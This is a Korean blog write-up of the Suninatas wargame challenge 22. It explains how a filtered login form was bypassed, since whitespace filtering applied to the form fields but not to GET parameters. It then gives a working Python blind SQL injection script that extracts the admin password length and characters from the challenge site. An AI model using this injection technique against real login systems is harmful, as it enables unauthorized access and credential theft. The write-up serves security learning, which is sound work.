---
title: "Suninatas 22 Write up"
categories: SQLi
tags: [blindSQLi, wargame, sunitas]
---

Suninatas 22 Write-Up
---------------------

## 문제 분석

문제에 접속하면 아래와 같은 로그인 창과 필터링 되는 단어들을 확인할 수 있었습니다.
필터링 내용들을 살펴보면 여태까지 봤던 문제 중 가장 많은 것을 볼 수 있었습니다.

![Suninatas_22_Main](https://github.com/Jun-Project-LAB/Jun-Project-LAB.github.io/blob/main/_image/suninatas_22_main.png?raw=true)

문제의 풀이 조건에 대해 알 필요가 있으므로 먼저 개발자 도구를 통해 소스코드를 확인한 결과
 주석에 admin 계정으로 로그인하라는 조건이 있는 것을 찾을 수 있었습니다.

![Suninatas_22_source](https://github.com/Jun-Project-LAB/Jun-Project-LAB.github.io/blob/main/_image/suninatas_22_source.png?raw=true)

따라서 이 문제의 flag는 admin 계정의 password 혹은 로그인 할 경우 얻을 수 있는 것으로 짐작할 수 있었습니다.

또한 테스트하기 위한 계정으로 guest/guest 계정이 있다고 하여 해당 계정을 이용하여 로그인 해보았습니다.

![Suninatas_22_guest](https://raw.githubusercontent.com/Jun-Project-LAB/Jun-Project-LAB.github.io/main/_image/sunintas_22_guest.png)

사진을 보면 알 수 있듯이 OK guest라는 문구가 출력되는 것을 알 수 있었고 로그인에 성공할 경우 OK 라고 뜨는 것을 단서로 하여 blind SQL Injection을 
시도하였습니다.

* * *

## Qeury Statement 작성

SQL Injection에 주로 사용되는 keyword들이 대거 필터링 되었기에 쉽게 풀이에 접근하지 못하였습니다.
제시되어 있는 키워드 이외에도 '(Single Quote), substring과 같은 keyword도 입력하려고 할 경우 no hack이라고 출력되었기에
 해결 방법을 찾지 못하였습니다. 

Null byte 삽입과 같은 방법으로 필터링을 우회할 수 있는 몇 가지 방법을 찾기도 하였으나 이를 공격으로 연계하지를 못하였습니다.
 다른 Write-Up을 찾아본 결과 생각보다 간단한 방법으로 풀이하였는데 한 가지 이해가 되지 않은 부분은 직접 GET 형식에 맞춰 작성한 것과
 id, pw 입력란에 입력한 내용이 필터링 대상이 다른 것이었습니다. 대표적으로 id, pw란에서는 white space가 필터링 대상이었는데 GET 형식으로 
직접 url란에 입력한 경우 white space가 필터링 되지 않았기 때문입니다.

* * *

어찌되었든 해결 방법에 대해서는 알았으므로 자동화 코드의 경우 직접 작성해보았습니다. password의 길이를 알아내는 부분에서 최대 길이를 15로 잡은 것은
 html code 내에서 pw 입력란을 최대 15자로 제한하였기 때문입니다. 코드의 경우 아래와 같이 작성했습니다.

>``` python

#!/usr/bin/python

import requests as req

cookies = {"ASP.NET_SessionId":"sbd2hldgbghcshskmhnubw2g", "ASPSESSIONIDSADBSAQD":"ONINCAKAHJGGDDMKBANMGNNP"}
url = "http://suninatas.com/challenge/web22/web22.asp"
maxpass = 15
length = 0
password = ""
parameter = {"pw":"haha"}

for i in range(maxpass):
    parameter['id']="admin' and len(pw)={}-- ".format(i+1)
    response = req.get(url, cookies=cookies, params=parameter)

    if response.text.find("OK") != -1:
        length = i+1
        print("Password length is {}".format(length))

for i in range(1, length+1):
    for j in range(32, 128):
        parameter['id'] = "admin' and substring(pw, {0}, 1)='{1}'--".format(i, chr(j))
        response = req.get(url, cookies=cookies, params=parameter)
        if response.text.find("OK") != -1:
            password += chr(j)

print("admin's password is " + password)
```

session의 경우 자신의 환경에 맞게 변경하여 사용하면 됩니다. 코드를 작성할 때 제대로 값이 출력되지 않아서 잘못 작성한 줄 알았었는데, 
문자를 비교하는 과정에서 이를 ' '로 묶어주지 않아서 숫자 값만 제대로 비교하고 문자 값의 경우 제대로 비교하지 못했던 오류가 있었습니다.
